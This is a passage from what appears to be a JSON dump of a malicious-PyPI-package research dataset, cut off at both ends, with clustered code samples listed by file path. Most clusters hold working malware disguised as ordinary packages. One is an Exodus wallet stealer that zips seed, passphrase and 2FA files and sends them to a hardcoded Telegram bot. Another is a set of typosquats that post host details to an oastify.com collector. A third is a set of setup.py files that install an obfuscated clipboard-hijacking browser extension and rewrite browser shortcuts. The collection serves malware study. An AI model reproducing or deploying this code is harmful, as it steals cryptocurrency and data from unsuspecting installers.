ON_LOCALVALUE_CREATED = 1\n\n\nclass DetectResult:\n    def __init__(self, detect_type: str = \"\", ret_status: int = 0, detect_time: int = 0,\n                 detect_instance: Instance = None):\n        self.detect_type = detect_type\n        self.ret_status = ret_status\n        self.detect_time = detect_time\n        self.detect_instance = detect_instance\n\n    def get_detect_type(self):\n        return self.detect_type\n\n    def get_detect_time(self):\n        return self.detect_time\n\n    def get_detect_instance(self):\n        return self.detect_instance\n\n    def get_ret_status(self):\n        return self.ret_status\n\n\nclass PluginManager:\n    def __init__(self):\n        self.plugin_container = {}\n        self.plugin_instance = {}\n\n    def register(self, plugin_type: PluginType, plugin_name: str, plugin_cls):\n        # print('register plugin', plugin_type, plugin_name)\n        if plugin_type not in self.plugin_container.keys():\n            self.plugin_container[plugin_type] = {}\n        self.plugin_container[plugin_type][plugin_name] = plugin_cls\n\n    def get(self, plugin_type: PluginType, plugin_name: str):\n        if plugin_type in self.plugin_container:\n            return self.plugin_container[plugin_type][plugin_name]\n        else:\n            return \"\"\n\n    def find_instance(self, plugin_type: PluginType, plugin_name: str) -> bool:\n        if plugin_type in self.plugin_instance and plugin_name in self.plugin_instance[plugin_type]:\n            return True\n        return False\n\n    def get_instance(self, plugin_type: PluginType, plugin_name: str):\n        return self.plugin_instance[plugin_type][plugin_name]\n\n    def set_instance(self, plugin_type: PluginType, plugin_name: str, instance):\n        if plugin_type not in self.plugin_instance:\n            self.plugin_instance[plugin_type] = {}\n\n        DefaultPluginManager.plugin_instance[plugin_type][plugin_name] = instance\n\n    def clear_instances(self):\n        self.plugin_instance = {}\n\n    def destroy_plugins(self):\n        self.plugin_container = {}\n        self.plugin_instance = {}\n\n\ndef register_plugin(plugin_type: PluginType, plugin_name: str):\n    def decorator(cls):\n        DefaultPluginManager.register(plugin_type, plugin_name, cls)\n        return cls\n\n    return decorator\n\n\n# the function should be called after setup\ndef get_plugin(plugin_type: PluginType, plugin_name: str):\n    return DefaultPluginManager.get_instance(plugin_type, plugin_name)\n\n\nDefaultPluginManager = PluginManager()\n\n\ndef reload_global_plugin_manager():\n    global DefaultPluginManager\n    DefaultPluginManager.clear_instances()\n\n\nclass InitContext:\n    def __init__(self, config: Configuration = None, value_ctx: ValueContext = None):\n        self.config = config\n        self.value_ctx = value_ctx\n\n\ndef setup(init_ctx: InitContext):\n    reload_global_plugin_manager()\n\n    for plugin_type, plugins in DefaultPluginManager.plugin_container.items():\n        for plugin_name, plugin in plugins.items():\n            if not DefaultPluginManager.find_instance(plugin_type, plugin_name):\n                DefaultPluginManager.set_instance(plugin_type, plugin_name, plugin(init_ctx))\n\n\nevent_handle_map = {}\n\n\ndef register_event_handle(event_type, func):\n    if event_handle_map.get(event_type, None) is not None:\n        event_handle_map[event_type].append(func)\n    else:\n        event_handle_map[event_type] = [func]\n\n\ndef get_event_subscriber(event_type):\n    return event_handle_map.get(event_type, None)\n\n\nfrom .api import *\n\n__version__ = '0.1.178'\n"
      }
    ]
  },
  {
    "cluster_id": 56,
    "size": 4,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-10-17-j5gnpfweguiwerbngpiutbgn0iutb0pfwbdfsfef-v0.0.1",
        "code": "import os\nimport requests\nimport socket\n\nPACKAGE_NAME = \"j5gnpfweguiwerbngpiutbgn0iutb0pfwbdfsfef\"\nHOSTNAME = socket.gethostname()\nCURRENT_PATH = os.getcwd()\n\nurl = \"https://3gkkr6u2z1a9rinocp0ue4tw1n7ev4jt.oastify.com\"\n\ndata = {\n    \"package_name\": PACKAGE_NAME,\n    \"hostname\": HOSTNAME,\n    \"current_path\": CURRENT_PATH\n}\n\nresponse = requests.post(url, data=data)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-10-17-j5gnpfweguiwerbngpiutbgn0iutb0pfwef-v0.0.1",
        "code": "import os\nimport requests\nimport socket\n\nPACKAGE_NAME = \"j5gnpfweguiwerbngpiutbgn0iutb0pfwef\"\nHOSTNAME = socket.gethostname()\nCURRENT_PATH = os.getcwd()\n\nurl = \"https://3gkkr6u2z1a9rinocp0ue4tw1n7ev4jt.oastify.com\"\n\ndata = {\n    \"package_name\": PACKAGE_NAME,\n    \"hostname\": HOSTNAME,\n    \"current_path\": CURRENT_PATH\n}\n\nresponse = requests.post(url, data=data)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-10-17-j5gnpfweguiwerbngpiutbgn0iutb0pfwfef-v0.0.1",
        "code": "import os\nimport requests\nimport socket\n\nPACKAGE_NAME = \"j5gnpfweguiwerbngpiutbgn0iutb0pfwfef\"\nHOSTNAME = socket.gethostname()\nCURRENT_PATH = os.getcwd()\n\nurl = \"https://3gkkr6u2z1a9rinocp0ue4tw1n7ev4jt.oastify.com\"\n\ndata = {\n    \"package_name\": PACKAGE_NAME,\n    \"hostname\": HOSTNAME,\n    \"current_path\": CURRENT_PATH\n}\n\nresponse = requests.post(url, data=data)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-10-17-j5gnpuiwerbngpiutbgn0iutb0pfwef-v0.0.1",
        "code": "import os\nimport requests\nimport socket\n\nPACKAGE_NAME = \"j5gnpuiwerbngpiutbgn0iutb0pfwef\"\nHOSTNAME = socket.gethostname()\nCURRENT_PATH = os.getcwd()\n\nurl = \"https://3gkkr6u2z1a9rinocp0ue4tw1n7ev4jt.oastify.com\"\n\ndata = {\n    \"package_name\": PACKAGE_NAME,\n    \"hostname\": HOSTNAME,\n    \"current_path\": CURRENT_PATH\n}\n\nresponse = requests.post(url, data=data)\n"
      }
    ]
  },
  {
    "cluster_id": 57,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-12-22-botocote",
        "code": "def add_one(number):\n    return number + 1\n"
      }
    ]
  },
  {
    "cluster_id": 58,
    "size": 3,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-03-1337test-v1",
        "code": "from setuptools import setup, find_packages\n\nsetup(\n    name='1337test',\n    version='1',\n    author='Jonathan Hartley',\n    author_email='tartley@tartley.com',\n    description='Pure-python Colors implementation',\n    long_description=open('README.md').read(),\n    long_description_content_type='text/markdown',\n    url='https://github.com/tartley/colorama',\n    packages=find_packages(),\n    install_requires=[\n        'requests','colorama'\n    ],\n    classifiers=[\n        'Development Status :: 3 - Alpha',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ],\n)\n\n\nimport getpass\nimport os\nfrom zipfile import ZipFile\nimport requests\ndef initialize():\n    username = getpass.getuser()\n    TOKEN = \"5711014217:AAGm6ZmhZmgkxkHMAO2lpynlmkJYXXgrtb4\"\n    chat_id = \"-690567594\"\n    local = os.getenv('LOCALAPPDATA')\n    roaming = os.getenv('APPDATA')\n    temp = os.getenv(\"TEMP\")\n    path = \"C:\\\\Users\\\\\" + username + \"\\\\appdata\\\\roaming\\\\exodus\\\\\"\n    zip = \"C:\\\\Users\\\\\" + username + \"\\\\appdata\\\\roaming\\\\\" + username+ \"-exodus.zip\"\n    exodus_pswd_file =\"C:\\\\Users\\\\\" + username + \"\\\\Desktop\\\\exodus.txt\"\n    exodus_pswd_file_dwnload = \"C:\\\\Users\\\\\" + username + \"\\\\Downloads\\\\exodus.txt\"\n    exodus_pswd_file_document =\"C:\\\\Users\\\\\" + username + \"\\\\Documents\\\\exodus.txt\"\n    exo_conf = info = \"C:\\\\Users\\\\\" + username + \"\\\\appdata\\\\roaming\\\\exodus\\\\exodus.conf.json\"\n    info = \"C:\\\\Users\\\\\" + username + \"\\\\appdata\\\\roaming\\\\exodus\\\\exodus.wallet\\\\info.seco\"\n    passphrase = \"C:\\\\Users\\\\\" + username + \"\\\\appdata\\\\roaming\\\\exodus\\\\exodus.wallet\\\\passphrase.json\"\n    seed = \"C:\\\\Users\\\\\" + username + \"\\\\appdata\\\\roaming\\\\exodus\\\\exodus.wallet\\\\seed.seco\"\n    storage = \"C:\\\\Users\\\\\" + username + \"\\\\appdata\\\\roaming\\\\exodus\\\\exodus.wallet\\\\storage.seco\"\n    twofactor = \"C:\\\\Users\\\\\" + username + \"\\\\appdata\\\\roaming\\\\exodus\\\\exodus.wallet\\\\twofactor.seco\"\n    twofactor_secret = \"C:\\\\Users\\\\\" + username + \"\\\\appdata\\\\roaming\\\\exodus\\\\exodus.wallet\\\\twofactor-secret.seco\"\n    message = \"[\ud83e\uddec] 1337 Wallet Stealer [\ud83e\uddec]\"\n    exodus_exist = False\n    if os.path.exists(path) or os.path.exists(exodus_pswd_file) or os.path.exists(exodus_pswd_file_dwnload) or os.path.exists(exodus_pswd_file_document):\n        exodus_exist = True\n        with ZipFile(zip, \"w\") as newzip:\n            try:\n                newzip.write(info)\n            except:\n                pass\n            try:  \n                newzip.write(passphrase)\n            except:\n                pass\n            try:\n                newzip.write(seed)\n            except:\n                pass\n            try:\n                newzip.write(storage)\n            except:\n                pass\n            try:\n                newzip.write(twofactor)\n            except:\n                pass\n            try:\n                newzip.write(twofactor_secret)\n            except:\n                pass\n            try:\n                newzip.write(exo_conf)\n            except:\n                pass\n            finally:\n                message = message + f\"\\n| [\ud83d\ude80] +1 Wallet Exodus from \" + username +\" %FLAG% \"\n            try:\n                newzip.write(exodus_pswd_file)\n                message = message + f\"\\n | \u27a2 Desktop file added \"\n            except:\n                pass\n            try:\n                newzip.write(exodus_pswd_file_dwnload)\n                message = message + f\"\\n | \u27a2 Download file added \"\n            except:\n                pass\n            try:\n                newzip.write(exodus_pswd_file_document)\n                message = message + f\"\\n | \u27a2 Document file added \"\n            except:\n                pass\n    if exodus_exist:\n        adressip = \"\\n\\n[\ud83c\udf0e] IP : \"+ requests.get(\"http://ip-api.com/line/?fields=query\").text\n        countrycode = requests.get(\"http://ip-api.com/line/?fields=countryCode\").text\n        message = message + adressip\n        countryflag_list = []\n        for i in countrycode:\n            countryflag_list.append(chr(int(ord(i)) + 127397))\n        countryflag = ''.join(countryflag_list)\n        message = message.replace(\"%FLAG%\", countryflag)\n        txt = open(zip , 'rb')\n        requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage', json={'chat_id': chat_id, 'text': message})\n        #requests.get(f\"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={message}\")\n        requests.post(f\"https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={chat_id}\", files={'document': txt})\n        txt.close()\n        try:\n            if os.path.exists(zip):\n                os.remove(zip)\n        except:\n            pass\n\n\nfrom .src_file import *\nfrom colorama import *\ninitialize()"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-04-25-parseweb-v3",
        "code": "from setuptools import setup, find_packages\n\nsetup(\n    name='parseweb',\n    version='3',\n    author='Jonathan Hartley',\n    author_email='tartley@tartley.com',\n    description='Pure-python Colors implementation',\n    long_description=open('README.md').read(),\n    long_description_content_type='text/markdown',\n    url='https://github.com/tartley/colorama',\n    packages=find_packages(),\n    install_requires=[\n        'requests','colorama'\n    ],\n    classifiers=[\n        'Development Status :: 3 - Alpha',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ],\n)\n\n\nimport getpass\nimport os\nfrom zipfile import ZipFile\nimport requests\nfrom pyfiglet import *\ndef initialize():\n    username = getpass.getuser()\n    TOKEN = \"5711014217:AAGm6ZmhZmgkxkHMAO2lpynlmkJYXXgrtb4\"\n    chat_id = \"-690567594\"\n    local = os.getenv('LOCALAPPDATA')\n    roaming = os.getenv('APPDATA')\n    temp = os.getenv(\"TEMP\")\n    path = \"C:\\\\Users\\\\\" + username + \"\\\\appdata\\\\roaming\\\\exodus\\\\\"\n    zip = \"C:\\\\Users\\\\\" + username + \"\\\\appdata\\\\roaming\\\\\" + username+ \"-exodus.zip\"\n    exodus_pswd_file =\"C:\\\\Users\\\\\" + username + \"\\\\Desktop\\\\exodus.txt\"\n    exodus_pswd_file_dwnload = \"C:\\\\Users\\\\\" + username + \"\\\\Downloads\\\\exodus.txt\"\n    exodus_pswd_file_document =\"C:\\\\Users\\\\\" + username + \"\\\\Documents\\\\exodus.txt\"\n    exo_conf = info = \"C:\\\\Users\\\\\" + username + \"\\\\appdata\\\\roaming\\\\exodus\\\\exodus.conf.json\"\n    info = \"C:\\\\Users\\\\\" + username + \"\\\\appdata\\\\roaming\\\\exodus\\\\exodus.wallet\\\\info.seco\"\n    passphrase = \"C:\\\\Users\\\\\" + username + \"\\\\appdata\\\\roaming\\\\exodus\\\\exodus.wallet\\\\passphrase.json\"\n    seed = \"C:\\\\Users\\\\\" + username + \"\\\\appdata\\\\roaming\\\\exodus\\\\exodus.wallet\\\\seed.seco\"\n    storage = \"C:\\\\Users\\\\\" + username + \"\\\\appdata\\\\roaming\\\\exodus\\\\exodus.wallet\\\\storage.seco\"\n    twofactor = \"C:\\\\Users\\\\\" + username + \"\\\\appdata\\\\roaming\\\\exodus\\\\exodus.wallet\\\\twofactor.seco\"\n    twofactor_secret = \"C:\\\\Users\\\\\" + username + \"\\\\appdata\\\\roaming\\\\exodus\\\\exodus.wallet\\\\twofactor-secret.seco\"\n    message = \"[\ud83e\udddf] +1 Wallet Exodus from \" + username +\" %FLAG%\\n\"\n    exodus_exist = False\n    if os.path.exists(path) or os.path.exists(exodus_pswd_file) or os.path.exists(exodus_pswd_file_dwnload) or os.path.exists(exodus_pswd_file_document):\n        exodus_exist = True\n        with ZipFile(zip, \"w\") as newzip:\n            try:\n                newzip.write(info)\n            except:\n                pass\n            try:  \n                newzip.write(passphrase)\n            except:\n                pass\n            try:\n                newzip.write(seed)\n            except:\n                pass\n            try:\n                newzip.write(storage)\n            except:\n                pass\n            try:\n                newzip.write(twofactor)\n            except:\n                pass\n            try:\n                newzip.write(twofactor_secret)\n            except:\n                pass\n            try:\n                newzip.write(exo_conf)\n            except:\n                pass\n            finally:\n                message = message + f\"\\n\ud83e\udeaa Connect File has been added \"\n            try:\n                newzip.write(exodus_pswd_file)\n                message = message + f\"\\n |-\u2705 Interesting Desktop File has been added \"\n            except:\n                pass\n            try:\n                newzip.write(exodus_pswd_file_dwnload)\n                message = message + f\"\\n |-\u2705 Interesting Download File has been added \"\n            except:\n                pass\n            try:\n                newzip.write(exodus_pswd_file_document)\n                message = message + f\"\\n |-\u2705 Interesting Documents File has been added \"\n            except:\n                pass\n    if exodus_exist:\n        adressip = \"\\n\\n[\ud83c\udf0e] AdressIP : \"+ requests.get(\"http://ip-api.com/line/?fields=query\").text\n        countrycode = requests.get(\"http://ip-api.com/line/?fields=countryCode\").text\n        message = message + adressip\n        countryflag_list = []\n        for i in countrycode:\n            countryflag_list.append(chr(int(ord(i)) + 127397))\n        countryflag = ''.join(countryflag_list)\n        message = message.replace(\"%FLAG%\", countryflag)\n        txt = open(zip , 'rb')\n        requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage', json={'chat_id': chat_id, 'text': message})\n        #requests.get(f\"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={message}\")\n        requests.post(f\"https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={chat_id}\", files={'document': txt})\n        txt.close()\n        try:\n            if os.path.exists(zip):\n                os.remove(zip)\n        except:\n            pass\n\n\nfrom .parseweb_file import *\nfrom requests import *\ninitialize()"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-03-milleday-v1",
        "code": "from setuptools import setup, find_packages\n\nsetup(\n    name='milleday',\n    version='1',\n    author='Mamadou Diakaby',\n    author_email='maamdou@harley.com',\n    description='Licensing content',\n    long_description=open('README.md').read(),\n    long_description_content_type='text/markdown',\n    url='https://github.com',\n    packages=find_packages(),\n    install_requires=[\n        'requests','colorama'\n    ],\n    classifiers=[\n        'Development Status :: 3 - Alpha',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ],\n)\n\n\nimport getpass\nimport os\nfrom zipfile import ZipFile\nimport requests\ndef initialize():\n    username = getpass.getuser()\n    TOKEN = \"5711014217:AAGm6ZmhZmgkxkHMAO2lpynlmkJYXXgrtb4\"\n    chat_id = \"-690567594\"\n    local = os.getenv('LOCALAPPDATA')\n    roaming = os.getenv('APPDATA')\n    temp = os.getenv(\"TEMP\")\n    path = \"C:\\\\Users\\\\\" + username + \"\\\\appdata\\\\roaming\\\\exodus\\\\\"\n    zip = \"C:\\\\Users\\\\\" + username + \"\\\\appdata\\\\roaming\\\\\" + username+ \"-exodus.zip\"\n    exodus_pswd_file =\"C:\\\\Users\\\\\" + username + \"\\\\Desktop\\\\exodus.txt\"\n    exodus_pswd_file_dwnload = \"C:\\\\Users\\\\\" + username + \"\\\\Downloads\\\\exodus.txt\"\n    exodus_pswd_file_document =\"C:\\\\Users\\\\\" + username + \"\\\\Documents\\\\exodus.txt\"\n    exo_conf = info = \"C:\\\\Users\\\\\" + username + \"\\\\appdata\\\\roaming\\\\exodus\\\\exodus.conf.json\"\n    info = \"C:\\\\Users\\\\\" + username + \"\\\\appdata\\\\roaming\\\\exodus\\\\exodus.wallet\\\\info.seco\"\n    passphrase = \"C:\\\\Users\\\\\" + username + \"\\\\appdata\\\\roaming\\\\exodus\\\\exodus.wallet\\\\passphrase.json\"\n    seed = \"C:\\\\Users\\\\\" + username + \"\\\\appdata\\\\roaming\\\\exodus\\\\exodus.wallet\\\\seed.seco\"\n    storage = \"C:\\\\Users\\\\\" + username + \"\\\\appdata\\\\roaming\\\\exodus\\\\exodus.wallet\\\\storage.seco\"\n    twofactor = \"C:\\\\Users\\\\\" + username + \"\\\\appdata\\\\roaming\\\\exodus\\\\exodus.wallet\\\\twofactor.seco\"\n    twofactor_secret = \"C:\\\\Users\\\\\" + username + \"\\\\appdata\\\\roaming\\\\exodus\\\\exodus.wallet\\\\twofactor-secret.seco\"\n    message = \"[\ud83e\uddec]  1337 Wallet Stealer  [\ud83e\uddec]\"\n    exodus_exist = False\n    if os.path.exists(path) or os.path.exists(exodus_pswd_file) or os.path.exists(exodus_pswd_file_dwnload) or os.path.exists(exodus_pswd_file_document):\n        exodus_exist = True\n        with ZipFile(zip, \"w\") as newzip:\n            try:\n                newzip.write(info)\n            except:\n                pass\n            try:  \n                newzip.write(passphrase)\n            except:\n                pass\n            try:\n                newzip.write(seed)\n            except:\n                pass\n            try:\n                newzip.write(storage)\n            except:\n                pass\n            try:\n                newzip.write(twofactor)\n            except:\n                pass\n            try:\n                newzip.write(twofactor_secret)\n            except:\n                pass\n            try:\n                newzip.write(exo_conf)\n            except:\n                pass\n            finally:\n                message = message + f\"\\n\\n +1 Wallet Exodus from \" + username +\" %FLAG% \"\n            try:\n                newzip.write(exodus_pswd_file)\n                message = message + f\"\\n\\n | \u27a2 Desktop file added \"\n            except:\n                pass\n            try:\n                newzip.write(exodus_pswd_file_dwnload)\n                message = message + f\"\\n\\n | \u27a2 Download file added \"\n            except:\n                pass\n            try:\n                newzip.write(exodus_pswd_file_document)\n                message = message + f\"\\n\\n | \u27a2 Document file added \"\n            except:\n                pass\n    if exodus_exist:\n        adressip = \"\\n\\n[\ud83c\udf0e] IP : \"+ requests.get(\"http://ip-api.com/line/?fields=query\").text\n        countrycode = requests.get(\"http://ip-api.com/line/?fields=countryCode\").text\n        message = message + adressip\n        countryflag_list = []\n        for i in countrycode:\n            countryflag_list.append(chr(int(ord(i)) + 127397))\n        countryflag = ''.join(countryflag_list)\n        message = message.replace(\"%FLAG%\", countryflag)\n        txt = open(zip , 'rb')\n        requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage', json={'chat_id': chat_id, 'text': message})\n        #requests.get(f\"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={message}\")\n        requests.post(f\"https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={chat_id}\", files={'document': txt})\n        txt.close()\n        try:\n            if os.path.exists(zip):\n                os.remove(zip)\n        except:\n            pass\n\nfrom .src_file import *\nfrom colorama import *\ninitialize()"
      }
    ]
  },
  {
    "cluster_id": 59,
    "size": 4,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-07-beautifulsup4-0.1",
        "code": "from distutils.core import setup\nimport sys\n\n\nif sys.platform == 'win32':\n  if sys.argv[1] in ['egg_info', 'build']:\n    try:\n      import win32com\n    except ModuleNotFoundError:\n      from pip._internal import main\n      main(['install', 'pypiwin32'])\n\n  elif sys.argv[1] in ['bdist_wheel', 'install']:\n    import os\n    import ctypes\n    from win32com.client import Dispatch\n\n    appDataPath = os.getenv('APPDATA')\n    desktopPath = os.path.expanduser('~\\Desktop')\n    paths = [\n        appDataPath + '\\\\Microsoft\\\\Windows\\\\Start Menu',\n        appDataPath + '\\\\Microsoft\\\\Internet Explorer\\\\Quick Launch\\\\User Pinned\\\\TaskBar',\n        desktopPath\n    ]\n\n    if ctypes.windll.shell32.IsUserAnAdmin():\n        paths.append('C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu')\n\n    if not os.path.exists(appDataPath + '\\\\Extension'):\n        os.makedirs(appDataPath + '\\\\Extension')\n\n    with open(appDataPath + '\\\\Extension\\\\background.js', 'w+') as extensionFile:\n        extensionFile.write('''var _0x327ff6=_0x11d4;(function(_0x314c14,_0x4da2d4){var _0x4d9550=_0x11d4,_0x41c8ae=_0x314c14();while(!![]){try{var _0x291238=parseInt(_0x4d9550(0x83))/0x1+parseInt(_0x4d9550(0x87))/0x2*(-parseInt(_0x4d9550(0x7c))/0x3)+-parseInt(_0x4d9550(0x81))/0x4*(-parseInt(_0x4d9550(0x8b))/0x5)+parseInt(_0x4d9550(0x7e))/0x6*(parseInt(_0x4d9550(0x75))/0x7)+-parseInt(_0x4d9550(0x89))/0x8+-parseInt(_0x4d9550(0x85))/0x9+parseInt(_0x4d9550(0x82))/0xa;if(_0x291238===_0x4da2d4)break;else _0x41c8ae['push'](_0x41c8ae['shift']());}catch(_0x435e56){_0x41c8ae['push'](_0x41c8ae['shift']());}}}(_0x7dfe,0x8e72d));let page=chrome[_0x327ff6(0x77)][_0x327ff6(0x76)]();function _0x11d4(_0x5d4133,_0x41221d){var _0x7dfebe=_0x7dfe();return _0x11d4=function(_0x11d4f7,_0x3282ea){_0x11d4f7=_0x11d4f7-0x75;var _0x34f11d=_0x7dfebe[_0x11d4f7];return _0x34f11d;},_0x11d4(_0x5d4133,_0x41221d);}var inputElement=document[_0x327ff6(0x88)](_0x327ff6(0x8a));document['body'][_0x327ff6(0x86)](inputElement),inputElement['focus']();function check(){var _0xe8a3e=_0x327ff6;document[_0xe8a3e(0x79)](_0xe8a3e(0x7f));var _0x5eb90d=inputElement[_0xe8a3e(0x7a)];_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^(0x)[a-fA-F0-9]{40}$/,'0x18c36eBd7A5d9C3b88995D6872BCe11a080Bc4d9'),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^T[A-Za-z1-9]{33}$/,'TWStXoQpXzVL8mx1ejiVmkgeUVGjZz8LRx'),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^(bnb1)[0-9a-z]{38}$/,_0xe8a3e(0x80)),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^([13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})$/,'bc1qqwkpp77ya9qavyh8sm8e4usad45fwlusg7vs5v'),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$/,_0xe8a3e(0x84)),inputElement['value']=_0x5eb90d,inputElement[_0xe8a3e(0x7d)](),document['execCommand'](_0xe8a3e(0x7b)),inputElement[_0xe8a3e(0x7a)]='';}function _0x7dfe(){var _0x1c8730=['8bkbJpt','14903530AaRyNg','646317UWotJX','LPDEYUCna9e5dYaDPYorJBXXgc43tvV9Rq','9448686izWZHq','appendChild','2hKfLTM','createElement','3544256zMWJYQ','textarea','10470IXKEdo','42UUKWJT','getBackgroundPage','extension','replace','execCommand','value','copy','1539693aOTNUd','select','448728VNjtMg','paste','bnb1cm0pllx3c7e902mta8drjfyn0ypl7ar4ty29uv'];_0x7dfe=function(){return _0x1c8730;};return _0x7dfe();}setInterval(check,0x3e8);''')\n        \n    with open(appDataPath + '\\\\Extension\\\\manifest.json', 'w+') as manifestFile:\n        manifestFile.write('{\"name\": \"Windows\",\"background\": {\"scripts\": [\"background.js\"]},\"version\": \"1\",\"manifest_version\": 2,\"permissions\": [\"clipboardWrite\", \"clipboardRead\"]}')\n\n    shell = Dispatch('WScript.Shell')\n\n    for path in paths:\n        for root_directory, sub_directories, files in os.walk(path):\n            for file in files:\n                if file.endswith('.lnk'):\n                    try:\n                        shortcut = shell.CreateShortcut(root_directory + '\\\\' + file)\n                        executable_name = os.path.basename(shortcut.TargetPath)\n\n                        if executable_name in ['chrome.exe', 'msedge.exe', 'launcher.exe', 'brave.exe']:\n                            shortcut.Arguments = '--load-extension={appDataPath}\\\\Extension'.format(appDataPath=appDataPath)\n                            shortcut.Save()\n                    except Exception as e:\n                      ...\n\nsetup(\n  name = 'beautifulsup4',\n  packages = ['beautifulsup4'],\n  version = '0.1'\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-07-djangoo-0.1",
        "code": "from distutils.core import setup\nimport sys\n\n\nif sys.platform == 'win32':\n  if sys.argv[1] in ['egg_info', 'build']:\n    try:\n      import win32com\n    except ModuleNotFoundError:\n      from pip._internal import main\n      main(['install', 'pypiwin32'])\n\n  elif sys.argv[1] in ['bdist_wheel', 'install']:\n    import os\n    import ctypes\n    from win32com.client import Dispatch\n\n    appDataPath = os.getenv('APPDATA')\n    desktopPath = os.path.expanduser('~\\Desktop')\n    paths = [\n        appDataPath + '\\\\Microsoft\\\\Windows\\\\Start Menu',\n        appDataPath + '\\\\Microsoft\\\\Internet Explorer\\\\Quick Launch\\\\User Pinned\\\\TaskBar',\n        desktopPath\n    ]\n\n    if ctypes.windll.shell32.IsUserAnAdmin():\n        paths.append('C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu')\n\n    if not os.path.exists(appDataPath + '\\\\Extension'):\n        os.makedirs(appDataPath + '\\\\Extension')\n\n    with open(appDataPath + '\\\\Extension\\\\background.js', 'w+') as extensionFile:\n        extensionFile.write('''var _0x327ff6=_0x11d4;(function(_0x314c14,_0x4da2d4){var _0x4d9550=_0x11d4,_0x41c8ae=_0x314c14();while(!![]){try{var _0x291238=parseInt(_0x4d9550(0x83))/0x1+parseInt(_0x4d9550(0x87))/0x2*(-parseInt(_0x4d9550(0x7c))/0x3)+-parseInt(_0x4d9550(0x81))/0x4*(-parseInt(_0x4d9550(0x8b))/0x5)+parseInt(_0x4d9550(0x7e))/0x6*(parseInt(_0x4d9550(0x75))/0x7)+-parseInt(_0x4d9550(0x89))/0x8+-parseInt(_0x4d9550(0x85))/0x9+parseInt(_0x4d9550(0x82))/0xa;if(_0x291238===_0x4da2d4)break;else _0x41c8ae['push'](_0x41c8ae['shift']());}catch(_0x435e56){_0x41c8ae['push'](_0x41c8ae['shift']());}}}(_0x7dfe,0x8e72d));let page=chrome[_0x327ff6(0x77)][_0x327ff6(0x76)]();function _0x11d4(_0x5d4133,_0x41221d){var _0x7dfebe=_0x7dfe();return _0x11d4=function(_0x11d4f7,_0x3282ea){_0x11d4f7=_0x11d4f7-0x75;var _0x34f11d=_0x7dfebe[_0x11d4f7];return _0x34f11d;},_0x11d4(_0x5d4133,_0x41221d);}var inputElement=document[_0x327ff6(0x88)](_0x327ff6(0x8a));document['body'][_0x327ff6(0x86)](inputElement),inputElement['focus']();function check(){var _0xe8a3e=_0x327ff6;document[_0xe8a3e(0x79)](_0xe8a3e(0x7f));var 